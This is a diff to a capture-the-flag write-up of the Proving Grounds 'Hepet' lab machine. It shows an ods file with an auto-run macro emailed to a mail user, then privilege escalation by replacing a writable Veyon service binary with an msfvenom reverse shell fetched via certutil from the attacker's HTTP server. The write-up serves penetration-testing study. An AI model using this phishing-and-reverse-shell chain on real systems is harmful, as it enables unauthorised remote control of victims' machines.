@@ -94,18 +94,77 @@ Opening a empty calc and save as a ods file.
 
 Adding a new marco.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h33m02s_002_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h15m17s_016_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h34m03s_003_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h16m25s_017_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h56m50s_004_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h17m25s_018_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_15h57m07s_005_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h18m45s_019_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h21m09s_020_.png)
 
 We set marco to execute when the ods file is opened.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h00m23s_006_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h21m53s_021_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h06m28s_007_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h22m38s_022_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_16h01m01s_008_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h23m11s_023_.png)
+
+Sending ods file and waiting for five minutes.
+
+```
+sendemail -f 'jonas@localhost' \                                                          
+                       -t 'mailadmin@localhost' \
+                       -s 192.168.220.140:25 \
+                       -u 'file' \
+                       -m 'file' \
+                       -a shell.ods
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h19m26s_031_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h47m17s_024_.png)
+
+#### Escalation
+
+Finding services.
+
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "auto"
+```
+
+Veyon service is installed in a folder that the user can access.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_18h53m44s_026_.png)
+
+Creating a reverse shell.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.220 LPORT=443 -f exe -o veyon-service.exe
+```
+
+We active the http server for file transfer.
+
+```
+python -m SimpleHTTPServer 8000 
+```
+
+The service could not be deleted, so use the move command. After that we download the reverse shell.
+
+```
+certutil -f -urlcache http://192.168.49.220:8000//veyon-service.exe veyon-service.exe
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h12m12s_029_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h12m33s_030_.png)
+
+Starting a new listener and rebooting.
+
+```
+shutdown /r
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_19h27m10s_032_.png)
